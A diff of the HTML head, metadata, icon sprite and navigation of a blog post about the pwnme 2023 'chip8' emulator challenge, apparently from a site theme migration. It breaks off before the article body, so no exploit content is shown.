@@ -1,966 +1,370 @@
 <!DOCTYPE html>
-<html
-  itemscope
-  itemtype="http://schema.org/WebPage"
-  lang="en"
-  class="color-toggle-hidden"
->
-  <head>
-    <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
 
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[pwnme 2023 - pwn] chip8 | repr</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="chip8 Solves: 24  Easy I just found a repo of a chip-8 emulator, it may be vulnerable but I didn’t had enough time to report the vulnerability with a working PoC.You must find a way to get the flag in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[pwnme 2023 - pwn] chip8">
+<meta property="og:url" content="https://n4sm.github.io/posts/chip8/index.html">
+<meta property="og:site_name" content="repr">
+<meta property="og:description" content="chip8 Solves: 24  Easy I just found a repo of a chip-8 emulator, it may be vulnerable but I didn’t had enough time to report the vulnerability with a working PoC.You must find a way to get the flag in">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-07T22:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-01T09:42:03.975Z">
+<meta property="article:author" content="nasm">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="nasm">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="pwnme">
+<meta property="article:tag" content="chip8">
+<meta property="article:tag" content="emulator">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+<meta name="generator" content="Hexo 6.3.0"></head>
 
-
-
-  <meta name="description" content="chip8      Solves: 24 Easy
-I just found a repo of a chip-8 emulator, it may be vulnerable but I didn&rsquo;t had enough time to report the vulnerability with a working PoC. You must find a way to get the flag in memory on the remote service !
-Author: Express#8049
-Remote service at : nc 51.254.39.184 1337
- chip8 is a emulator-pwn challenge I did during the pwnme CTF." />
-
-
-  <meta name="keywords" content="pwn,binary exploitation,cryptography,Reverse engineering,hypervisor" />
-
-
+<body>
   
   
     
-      
-      
-    
-  
-
-  
-    <meta name="author" content="nasm" />
-  
-
-
-    <title>
-      
-        [pwnme 2023 - pwn] chip8 | 
-      repr
-    </title>
-
-    <link rel="icon" type="image/svg+xml" href="/favicon/favicon.svg" />
-<link
-  rel="icon"
-  type="image/png"
-  sizes="48x48"
-  href="/favicon/favicon-32x32.png"
-/>
-<link
-  rel="icon"
-  type="image/png"
-  sizes="32x32"
-  href="/favicon/favicon-32x32.png"
-/>
-<link
-  rel="icon"
-  type="image/png"
-  sizes="16x16"
-  href="/favicon/favicon-16x16.png"
-/>
-
-    
-
-    <meta property="og:title" content="[pwnme 2023 - pwn] chip8" />
-<meta
-  property="og:description"
-  content="
-    
-      chip8      Solves: 24 Easy
-I just found a repo of a chip-8 emulator, it may be vulnerable but I didn&rsquo;t had enough time to report the vulnerability with a working PoC. You must find a way to get the flag in memory on the remote service !
-Author: Express#8049
-Remote service at : nc 51.254.39.184 1337
- chip8 is a emulator-pwn challenge I did during the pwnme CTF.
-    
-  "
-/>
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://nasm.re/posts/chip8/" />
-      <meta property="og:image" content="https://nasm.re/risa.png" />
-    <meta property="article:section" content="posts" />
-  
-    <meta
-      property="article:published_time"
-      content="2023-05-08T00:00:00+00:00"
-    />
-  
-  
-    <meta
-      property="article:modified_time"
-      content="2023-05-08T00:00:00+00:00"
-    />
-  
-
-<meta name="twitter:card" content="summary_large_image" />
-      <meta name="twitter:image" content="https://nasm.re/risa.png" />
-    
-<meta name="twitter:title" content="[pwnme 2023 - pwn] chip8" />
-<meta
-  name="twitter:description"
-  content="
-    
-      chip8      Solves: 24 Easy
-I just found a repo of a chip-8 emulator, it may be vulnerable but I didn&rsquo;t had enough time to report the vulnerability with a working PoC. You must find a way to get the flag in memory on the remote service !
-Author: Express#8049
-Remote service at : nc 51.254.39.184 1337
- chip8 is a emulator-pwn challenge I did during the pwnme CTF.
-    
-  "
-/>
-
-
-    <script src="/js/main-b22ac364.bundle.min.js"></script>
-
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/Metropolis.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/LiberationSans.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/GeekblogIcons.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-
-<link
-  rel="preload"
-  href="/main-2857a4bc.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/main-2857a4bc.min.css"
-  media="all"
-/>
-
-<link
-  rel="preload"
-  href="/mobile-3888ed2b.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/mobile-3888ed2b.min.css"
-  media="screen and (max-width: 45rem)"
-/>
-
-<link
-  rel="preload"
-  href="/print-8a905a2e.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/print-8a905a2e.min.css"
-  media="print"
-/>
-
-<link
-  rel="preload"
-  href="/custom.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/custom.css"
-  media="all"
-/>
-
-
-
-
-
-<!-- Made with Geekblog theme https://github.com/thegeeklab/hugo-geekblog -->
-
-    
-
-
-
-
-<script type="application/ld+json">
-{
-    "@context": "http://schema.org",
-    "@type": "BlogPosting",
-    "articleSection": "posts",
-    "name": "[pwnme 2023 - pwn] chip8",
-    "headline": "[pwnme 2023 - pwn] chip8",
-    "alternativeHeadline": "",
-    "description": "chip8      Solves: 24 Easy\nI just found a repo of a chip-8 emulator, it may be vulnerable but I didn\u0026rsquo;t had enough time to report the vulnerability with a working PoC. You must find a way to get the flag in memory on the remote service !\nAuthor: Express#8049\nRemote service at : nc 51.254.39.184 1337\n chip8 is a emulator-pwn challenge I did during the pwnme CTF.",
-    "inLanguage": "en",
-    "isFamilyFriendly": "true",
-    "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "https:\/\/nasm.re\/posts\/chip8\/"
-    },
-    "author" : [
-        {
-            "@type": "Person",
-            "name": "nasm"
-        }
-    ],
-    "copyrightHolder" : "repr",
-    "copyrightYear" : "2023",
-    "dateCreated": "2023-05-08T00:00:00.00Z",
-    "datePublished": "2023-05-08T00:00:00.00Z",
-    "dateModified": "2023-05-08T00:00:00.00Z",
-    "publisher":{
-        "@type":"Organization",
-        "name": "repr",
-        "url": "https://nasm.re",
-        "logo": {
-            "@type": "ImageObject",
-            "url": "https:\/\/nasm.re\/risa.png",
-            "width":"32",
-            "height":"32"
-        }
-    },
-    "url" : "https:\/\/nasm.re\/posts\/chip8\/",
-    "wordCount" : "1627",
-    "genre" : [ "ctf" , "nasm" , "pwn" , "linux" , "pwnme" , "chip8" , "emulator" ]
-}
-</script>
-
-
-    
-
-  </head>
-
-  <body>
-    
-  <!-- geekblog include: sprites/geekblog.svg -->
-  <svg class="svg-sprite" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_back" xmlns="http://www.w3.org/2000/svg"><path d="M31.999 14.035v3.93H7.673l11.134 11.228L16 32 .001 16.001 16 .002l2.807 2.807L7.673 14.037h24.326z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M7.954 17.965v5.988L.001 16l7.953-7.953v5.988H32v3.93H7.954z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M24.046 14.035V8.047L31.999 16l-7.953 7.953v-5.988H0v-3.93h24.046z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_bitbucket" xmlns="http://www.w3.org/2000/svg"><path d="M15.905 13.355c.189 1.444-1.564 2.578-2.784 1.839-1.375-.602-1.375-2.784-.034-3.403 1.151-.705 2.818.223 2.818 1.564zm1.907-.361c-.309-2.44-3.076-4.056-5.328-3.042-1.426.636-2.389 2.148-2.32 3.747.086 2.097 2.08 3.815 4.176 3.626s3.729-2.234 3.472-4.331zm4.108-9.315c-.756-.997-2.045-1.169-3.179-1.358-3.214-.516-6.513-.533-9.727.034-1.066.172-2.269.361-2.939 1.323 1.1 1.031 2.664 1.186 4.073 1.358 2.544.327 5.156.344 7.699.017 1.426-.172 3.008-.309 4.073-1.375zm.979 17.788c-.481 1.684-.206 3.953-1.994 4.932-3.076 1.701-6.806 1.89-10.191 1.289-1.787-.327-3.884-.894-4.864-2.578-.43-1.65-.705-3.334-.98-5.018l.103-.275.309-.155c5.121 3.386 12.288 3.386 17.427 0 .808.241.206 1.22.189 1.805zM26.01 4.951c-.584 3.764-1.255 7.51-1.908 11.257-.189 1.1-1.255 1.719-2.148 2.183-3.214 1.615-6.96 1.89-10.483 1.512-2.389-.258-4.829-.894-6.771-2.389-.911-.705-.911-1.908-1.083-2.922-.602-3.523-1.289-7.046-1.719-10.604.206-1.547 1.942-2.217 3.231-2.698C6.848.654 8.686.362 10.508.19c3.884-.378 7.854-.241 11.618.859 1.341.395 2.784.945 3.695 2.097.412.533.275 1.203.189 1.805z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_bookmark" xmlns="http://www.w3.org/2000/svg"><path d="M20.357 5.856q1.157 0 2.043.851t.885 2.008v23.284l-10.212-4.357-10.144 4.357V8.715q0-1.157.885-2.008t2.042-.851h14.502zm5.787 18.859V5.856q0-1.157-.851-2.042t-2.008-.885H8.715q0-1.157.885-2.042t2.043-.885h14.502q1.157 0 2.043.885t.885 2.042v23.216z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_auto" xmlns="http://www.w3.org/2000/svg"><path d="M16.846 18.938h2.382L15.22 7.785h-2.44L8.772 18.938h2.382l.871-2.44h3.95zm7.087-9.062L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809zm-11.385 4.937L14 10.282l1.452 4.531h-2.904z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_dark" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565q-1.51 0-3.079.697 1.917.871 3.108 2.701T15.22 14t-1.191 4.037-3.108 2.701q1.568.697 3.079.697zm9.933-11.559L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_light" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565 8.743 8.743 6.565 14t2.178 5.257T14 21.435zm9.933-3.311v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809L27.999 14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_check" xmlns="http://www.w3.org/2000/svg"><path d="M8.885 20.197L25.759 3.323l2.24 2.24L8.885 24.677 0 15.792l2.24-2.24z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_clear" xmlns="http://www.w3.org/2000/svg"><path d="M32 3.222L19.222 16 32 28.778l-3.221 3.221-12.778-12.778L3.223 31.999.002 28.778 12.78 16 .002 3.222 3.223.001l12.778 12.778L28.779.001z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_cloud_off" xmlns="http://www.w3.org/2000/svg"><path d="M9.023 10.5H7q-1.914 0-3.281 1.395t-1.367 3.309 1.367 3.281T7 19.852h11.375zM3.5 4.976l1.477-1.477L24.5 23.022l-1.477 1.477-2.352-2.297H6.999q-2.898 0-4.949-2.051t-2.051-4.949q0-2.844 1.969-4.867t4.758-2.133zm19.086 5.578q2.242.164 3.828 1.832T28 16.351q0 3.008-2.461 4.758l-1.695-1.695q1.805-.984 1.805-3.063 0-1.422-1.039-2.461t-2.461-1.039h-1.75v-.602q0-2.68-1.859-4.539t-4.539-1.859q-1.531 0-2.953.711l-1.75-1.695Q11.431 3.5 14.001 3.5q2.953 0 5.496 2.078t3.09 4.977z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_code" xmlns="http://www.w3.org/2000/svg"><path d="M9.917 24.5a1.75 1.75 0 10-3.501.001 1.75 1.75 0 003.501-.001zm0-21a1.75 1.75 0 10-3.501.001A1.75 1.75 0 009.917 3.5zm11.666 2.333a1.75 1.75 0 10-3.501.001 1.75 1.75 0 003.501-.001zm1.75 0a3.502 3.502 0 01-1.75 3.026c-.055 6.581-4.721 8.039-7.82 9.023-2.898.911-3.846 1.349-3.846 3.117v.474a3.502 3.502 0 011.75 3.026c0 1.932-1.568 3.5-3.5 3.5s-3.5-1.568-3.5-3.5c0-1.294.711-2.424 1.75-3.026V6.526A3.502 3.502 0 014.667 3.5c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5a3.502 3.502 0 01-1.75 3.026v9.06c.93-.456 1.914-.766 2.807-1.039 3.391-1.075 5.323-1.878 5.359-5.687a3.502 3.502 0 01-1.75-3.026c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_contacts" xmlns="http://www.w3.org/2000/svg"><path d="M22.688 22.688v-2q0-1.5-2.281-2.438t-4.406-.938-4.406.938-2.281 2.438v2h13.375zM16 9q-1.25 0-2.125.875T13 12t.875 2.125T16 15t2.125-.875T19 12t-.875-2.125T16 9zm10.688-3.687q1.063 0 1.844.813t.781 1.875v16q0 1.063-.781 1.875t-1.844.813H5.313q-1.063 0-1.844-.813t-.781-1.875v-16q0-1.063.781-1.875t1.844-.813h21.375zM5.313 32v-2.688h21.375V32H5.313zM26.688 0v2.688H5.313V0h21.375z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_copy" xmlns="http://www.w3.org/2000/svg"><path d="M23.502 25.438V7.626H9.562v17.812h13.94zm0-20.315q1.013 0 1.787.745t.774 1.757v17.812q0 1.013-.774 1.787t-1.787.774H9.562q-1.013 0-1.787-.774t-.774-1.787V7.625q0-1.013.774-1.757t1.787-.745h13.94zM19.689 0v2.562H4.438v17.812H1.936V2.562q0-1.013.745-1.787T4.438.001h15.251z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_create" xmlns="http://www.w3.org/2000/svg"><path d="M31.499 7.167l-3.25 3.25-6.666-6.666 3.25-3.25q.5-.5 1.25-.5t1.25.5l4.166 4.166q.5.5.5 1.25t-.5 1.25zM.001 25.333L19.667 5.667l6.666 6.666L6.667 31.999H.001v-6.666z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_date" xmlns="http://www.w3.org/2000/svg"><path d="M27.192 28.844V11.192H4.808v17.652h22.384zm0-25.689q1.277 0 2.253.976t.976 2.253v22.459q0 1.277-.976 2.216t-2.253.939H4.808q-1.352 0-2.291-.901t-.939-2.253V6.385q0-1.277.939-2.253t2.291-.976h1.577V.001h3.23v3.155h12.769V.001h3.23v3.155h1.577zm-3.155 11.267v3.155h-3.23v-3.155h3.23zm-6.46 0v3.155h-3.155v-3.155h3.155zm-6.384 0v3.155h-3.23v-3.155h3.23z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_download" xmlns="http://www.w3.org/2000/svg"><path d="M2.866 28.209h26.269v3.79H2.866v-3.79zm26.268-16.925L16 24.418 2.866 11.284h7.493V.001h11.283v11.283h7.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_email" xmlns="http://www.w3.org/2000/svg"><path d="M28.845 9.615v-3.23L16 14.422 3.155 6.385v3.23L16 17.577zm0-6.46q1.277 0 2.216.977T32 6.385v19.23q0 1.277-.939 2.253t-2.216.977H3.155q-1.277 0-2.216-.977T0 25.615V6.385q0-1.277.939-2.253t2.216-.977h25.69z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_git" xmlns="http://www.w3.org/2000/svg"><path d="M27.472 12.753L15.247.529a1.803 1.803 0 00-2.55 0l-2.84 2.84 2.137 2.137a2.625 2.625 0 013.501 3.501l3.499 3.499a2.625 2.625 0 11-1.237 1.237l-3.499-3.499c-.083.04-.169.075-.257.106v7.3a2.626 2.626 0 11-1.75 0v-7.3a2.626 2.626 0 01-1.494-3.607L8.62 4.606l-8.09 8.09a1.805 1.805 0 000 2.551l12.225 12.224a1.803 1.803 0 002.55 0l12.168-12.168a1.805 1.805 0 000-2.551z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_github" xmlns="http://www.w3.org/2000/svg"><path d="M16 .394c8.833 0 15.999 7.166 15.999 15.999 0 7.062-4.583 13.062-10.937 15.187-.813.146-1.104-.354-1.104-.771 0-.521.021-2.25.021-4.396 0-1.5-.5-2.458-1.083-2.958 3.562-.396 7.312-1.75 7.312-7.896 0-1.75-.625-3.167-1.646-4.291.167-.417.708-2.042-.167-4.25-1.333-.417-4.396 1.646-4.396 1.646a15.032 15.032 0 00-8 0S8.937 6.602 7.603 7.018c-.875 2.208-.333 3.833-.167 4.25-1.021 1.125-1.646 2.542-1.646 4.291 0 6.125 3.729 7.5 7.291 7.896-.458.417-.875 1.125-1.021 2.146-.917.417-3.25 1.125-4.646-1.333-.875-1.521-2.458-1.646-2.458-1.646-1.562-.021-.104.979-.104.979 1.042.479 1.771 2.333 1.771 2.333.938 2.854 5.396 1.896 5.396 1.896 0 1.333.021 2.583.021 2.979 0 .417-.292.917-1.104.771C4.582 29.455-.001 23.455-.001 16.393-.001 7.56 7.165.394 15.998.394zM6.063 23.372c.042-.083-.021-.187-.146-.25-.125-.042-.229-.021-.271.042-.042.083.021.187.146.25.104.062.229.042.271-.042zm.646.709c.083-.062.062-.208-.042-.333-.104-.104-.25-.146-.333-.062-.083.062-.062.208.042.333.104.104.25.146.333.062zm.625.937c.104-.083.104-.25 0-.396-.083-.146-.25-.208-.354-.125-.104.062-.104.229 0 .375s.271.208.354.146zm.875.875c.083-.083.042-.271-.083-.396-.146-.146-.333-.167-.417-.062-.104.083-.062.271.083.396.146.146.333.167.417.062zm1.187.521c.042-.125-.083-.271-.271-.333-.167-.042-.354.021-.396.146s.083.271.271.312c.167.062.354 0 .396-.125zm1.313.104c0-.146-.167-.25-.354-.229-.187 0-.333.104-.333.229 0 .146.146.25.354.229.187 0 .333-.104.333-.229zm1.208-.208c-.021-.125-.187-.208-.375-.187-.187.042-.312.167-.292.312.021.125.187.208.375.167s.312-.167.292-.292z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_gitlab" xmlns="http://www.w3.org/2000/svg"><path d="M1.629 11.034L14 26.888.442 17.048a1.09 1.09 0 01-.39-1.203l1.578-4.811zm7.217 0h10.309l-5.154 15.854zM5.753 1.475l3.093 9.559H1.63l3.093-9.559a.548.548 0 011.031 0zm20.618 9.559l1.578 4.811c.141.437-.016.922-.39 1.203l-13.558 9.84 12.371-15.854zm0 0h-7.216l3.093-9.559a.548.548 0 011.031 0z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_heart" xmlns="http://www.w3.org/2000/svg"><path d="M16 29.714a1.11 1.11 0 01-.786-.321L4.072 18.643c-.143-.125-4.071-3.714-4.071-8 0-5.232 3.196-8.357 8.535-8.357 3.125 0 6.053 2.464 7.464 3.857 1.411-1.393 4.339-3.857 7.464-3.857 5.339 0 8.535 3.125 8.535 8.357 0 4.286-3.928 7.875-4.089 8.035L16.785 29.392c-.214.214-.5.321-.786.321z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_keyboard_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M25.875 28.25L22.125 32 6.126 16.001 22.125.002l3.75 3.75-12.25 12.25z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_keyboard_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M6.125 28.25L18.375 16 6.125 3.75 9.875 0l15.999 15.999L9.875 31.998z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_keyborad_arrow_down" xmlns="http://www.w3.org/2000/svg"><path d="M3.281 5.36L14 16.079 24.719 5.36 28 8.641l-14 14-14-14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_keyborad_arrow_up" xmlns="http://www.w3.org/2000/svg"><path d="M24.719 22.64L14 11.921 3.281 22.64 0 19.359l14-14 14 14z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_link" xmlns="http://www.w3.org/2000/svg"><path d="M24.037 7.963q3.305 0 5.634 2.366T32 16t-2.329 5.671-5.634 2.366h-6.46v-3.08h6.46q2.028 0 3.493-1.465t1.465-3.493-1.465-3.493-3.493-1.465h-6.46v-3.08h6.46zM9.615 17.578v-3.155h12.77v3.155H9.615zM3.005 16q0 2.028 1.465 3.493t3.493 1.465h6.46v3.08h-6.46q-3.305 0-5.634-2.366T0 16.001t2.329-5.671 5.634-2.366h6.46v3.08h-6.46q-2.028 0-3.493 1.465t-1.465 3.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_menu" xmlns="http://www.w3.org/2000/svg"><path d="M.001 5.334h31.998v3.583H.001V5.334zm0 12.416v-3.5h31.998v3.5H.001zm0 8.916v-3.583h31.998v3.583H.001z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_notifications" xmlns="http://www.w3.org/2000/svg"><path d="M25.846 22.154l3.308 3.308v1.615H2.847v-1.615l3.308-3.308V14q0-3.846 1.961-6.692t5.423-3.692V2.462q0-1 .692-1.731T16 0t1.769.731.692 1.731v1.154q3.461.846 5.423 3.692T25.846 14v8.154zM16 32q-1.385 0-2.346-.923t-.962-2.308h6.615q0 1.308-1 2.269T15.999 32z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_person" xmlns="http://www.w3.org/2000/svg"><path d="M16 20.023q5.052 0 10.526 2.199t5.473 5.754v4.023H0v-4.023q0-3.555 5.473-5.754t10.526-2.199zM16 16q-3.275 0-5.614-2.339T8.047 8.047t2.339-5.661T16 0t5.614 2.386 2.339 5.661-2.339 5.614T16 16z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_pin" xmlns="http://www.w3.org/2000/svg"><path d="M17.6 19.2h9.6v-1.6L22.4 16V3.2l4.8-1.6V0H4.8v1.6l4.8 1.6V16l-4.8 1.6v1.6h9.6v11.2L16 32l1.6-1.6V19.2z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_rss_feed" xmlns="http://www.w3.org/2000/svg"><path d="M-.481 12.048q8.482 0 14.457 5.976t5.976 14.457h-5.879q0-5.976-4.289-10.264T-.48 17.928v-5.879zm0-11.565q13.204 0 22.601 9.397t9.397 22.601h-5.783q0-10.891-7.662-18.553T-.481 6.266V.483zm0 27.468q0-1.831 1.301-3.132t3.229-1.301 3.181 1.253 1.253 3.181-1.301 3.229-3.132 1.301q-1.928 0-3.229-1.301T-.48 27.952z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_search" xmlns="http://www.w3.org/2000/svg"><path d="M11.925 20.161q3.432 0 5.834-2.402t2.402-5.834-2.402-5.834-5.834-2.402-5.834 2.402-2.402 5.834 2.402 5.834 5.834 2.402zm10.981 0L32 29.255 29.255 32l-9.094-9.094v-1.458l-.515-.515q-3.26 2.831-7.721 2.831-4.976 0-8.45-3.432T.001 11.925t3.474-8.45 8.45-3.474 8.407 3.474 3.432 8.45q0 1.802-.858 4.075t-1.973 3.646l.515.515h1.458z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_security" xmlns="http://www.w3.org/2000/svg"><path d="M16 0l13.072 5.855v8.715q0 6.059-3.745 11.063T16 31.999q-5.583-1.362-9.327-6.366T2.928 14.57V5.855zm0 16v13.004q4.017-1.294 6.808-4.868T26.144 16H16zm0 0V3.2L5.856 7.693v8.306H16z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_star" xmlns="http://www.w3.org/2000/svg"><path d="M14 22.052L5.324 27.31l2.3-9.859L0 10.813l10.056-.854L14 .692l3.944 9.267L28 10.813l-7.624 6.638 2.3 9.859z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_tag" xmlns="http://www.w3.org/2000/svg"><path d="M17.52 17.52v-7.041h-7.041v7.041h7.041zM28 10.479h-7.041v7.041H28v3.439h-7.041V28H17.52v-7.041h-7.041V28H7.04v-7.041H-.001V17.52H7.04v-7.041H-.001V7.04H7.04V-.001h3.439V7.04h7.041V-.001h3.439V7.04H28v3.439z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_timer" xmlns="http://www.w3.org/2000/svg"><path d="M16 29q4.428 0 7.536-3.143t3.107-7.571-3.107-7.536T16 7.643 8.464 10.75t-3.107 7.536 3.107 7.571T16 29zM26.714 9.786q1.214 1.571 2.107 4.036t.893 4.464q0 5.643-4 9.678T16 32t-9.714-4.036-4-9.678 4-9.678T16 4.572q1.929 0 4.464.929t4.107 2.143l2.143-2.214q1.143.929 2.143 2.143zM14.5 19.857v-9.143h3v9.143h-3zM20.571.001v3.071h-9.143V.001h9.143z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_tree" xmlns="http://www.w3.org/2000/svg"><path d="M32 14.423H20.808V9.616h-3.23v12.77h3.23v-4.807H32v12.845H20.808v-4.807h-6.385v-16h-3.23v4.807H.001V1.579h11.192v4.807h9.615V1.579H32v12.845z"/></svg></defs></svg>
-
-
-
-
-    <div
-      class="wrapper dark-mode-dim"
-    >
-      <header class="gblog-header">
-  <div class="container flex flex-wrap">
-    <div class="gblog-header__col-1 flex justify-start hidden-mobile"></div>
-    <div class="gblog-header__col-2 flex align-center justify-center ">
-      <a class="gblog-header__link" rel="me" href="https://nasm.re">
-        <span class="gblog-brand flex align-center justify-center">
-          <img
-            class="gblog-brand__img"
-            src="/risa.png"
-            alt=""
-          />
-          <span class="gblog-brand__title">repr</span>
-        </span>
-        
-          <span class="gblog-brand__subtitle flex align-center justify-center">pwn, RE, crypto stuff</span>
-        
-      </a>
-    </div>
-    <div class="gblog-header__col-3 flex justify-end">
-      <span id="gblog-dark-mode">
-        <svg class="icon gblog_brightness_dark">
-          <title></title>
-          <use xlink:href="#gblog_brightness_dark"></use>
-        </svg>
-        <svg class="icon gblog_brightness_light">
-          <title></title>
-          <use xlink:href="#gblog_brightness_light"></use>
-        </svg>
-        <svg class="icon gblog_brightness_auto">
-          <title></title>
-          <use xlink:href="#gblog_brightness_auto"></use>
-        </svg>
-      </span>
-    </div>
-  </div>
-</header>
-<nav class="gblog-nav">
-  <input type="checkbox" id="menu-control" class="hidden" />
-  <div class="gblog-nav__control">
-    <label for="menu-control" class="flex align-center justify-center">
-      <svg class="icon gblog_menu"><use xlink:href="#gblog_menu"></use></svg>
-      <svg class="icon gblog_clear"><use xlink:href="#gblog_clear"></use></svg>
-      <span>Navigation</span>
-    </label>
-  </div>
-  <ul class="gblog-nav__list container flex flex-wrap justify-center menu-content">
-    
-    
-    
-      
-
-  
-  
-  
-
-  
-    
-      
-      
-      
-
-      
-        <li>
-          <a
-            href="
-              https://github.com/n4sm
-            "
-            class="gblog-nav__entry "
-          >
-            
-              <svg class="icon gblog_github"><use xlink:href="#gblog_github"></use></svg>
-            
-            Github Profile
-          </a>
-        </li>
-      
-    
-  
-    
-      
-      
-      
-
-      
-        <li>
-          <a
-            href="
-              /posts/about
-            "
-            class="gblog-nav__entry "
-          >
-            
-              <svg class="icon gblog_person"><use xlink:href="#gblog_person"></use></svg>
-            
-            About
-          </a>
-        </li>
-      
-    
-  
-
-
-
-
-
-
-    
-  </ul>
-</nav>
-
-
-
-      <main class="gblog-page container">
-        
-  <article class="gblog-post">
-    <header class="gblog-post__header">
-      
-      
-
-
-      <h1 class="gblog-post__title">[pwnme 2023 - pwn] chip8</h1>
-
-      
-        <div class="flex flex-wrap align-center gblog-post__meta gblog-post__meta--head">
-          <span class="flex align-center no-wrap">
